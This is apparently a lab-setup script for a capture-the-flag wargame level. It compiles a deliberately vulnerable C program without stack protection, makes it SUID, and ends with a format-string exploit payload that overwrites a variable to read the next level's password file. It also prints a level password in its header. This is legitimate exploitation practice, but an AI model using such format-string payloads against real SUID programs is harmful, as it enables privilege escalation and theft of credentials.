#!/bin/bash
# This script will allow to test the pseudo code in source.c file by copy it in the folder /tmp in the VM

# -------------------------------- PREREQUIRES -------------------------------- #
#                            From your local machine                            #
#       Copy the source and the script files in the tmp folder in your VM       #
#                  scp -P 4242 path/source.c level5@VM_IP:/tmp                  #
#                  scp -P 4242 path/script.sh level5@VM_IP:/tmp                 #
#                                                                               #
#     pwd: 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a     #
#                                                                               #
#                                                                               #
#                                                                               #
#                   Don't forget to run it ;) bash script.sh                    #
# ----------------------------------------------------------------------------- #

# Compile the program
gcc -fno-stack-protector -Wno-format-security source.c -o ft_level4
# -fno-stack-protector : https://stackoverflow.com/questions/1345670/stack-smashing-detected
# -Wno-format-security : https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html

# Set SUID to give root user permissions
chmod u+s ft_level4

# Add write and execution permissions on home directory
chmod +wx ~

# Move the program to home directory
mv ft_level4 ~


# Then you have to run the program and cat .pass as level4 by taping manually these commands

#	su level4
#	// check the new address of variable 'm', in this exemple it is 0x804a028
#	python -c 'print "\x28\xa0\x04\x08" + "%16930112d%12$n"' > /tmp/exploit
#	cat /tmp/exploit | /home/user/level5/ft_level4
